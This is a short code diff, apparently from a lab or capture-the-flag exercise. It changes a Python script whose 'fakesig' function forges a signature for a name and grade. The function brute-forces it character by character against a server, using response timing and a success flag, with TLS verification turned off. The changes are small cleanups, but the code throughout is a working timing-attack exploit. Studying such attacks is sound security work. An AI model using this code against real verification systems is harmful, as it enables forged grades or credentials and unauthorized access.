@@ -9,13 +9,10 @@ def submit(name, grade, signature):
                             params=payload, verify=False))
     return request.elapsed.total_seconds(), request.text
 
-def hexHash(concat):
-    return hashlib.sha1(concat.encode()).hexdigest()
-
 def fakesig(name, grade, signature, hexchars):
-    while len(signature) <= 20:
+    while len(signature) < 20:
         times = []
-        for x in range(0, len(hexchars)):
+        for x in range(len(hexchars)):
             time, result = submit(name, grade, (signature + hexchars[x]))
             if  result.strip() == "1":
                 signature += hexchars[x]
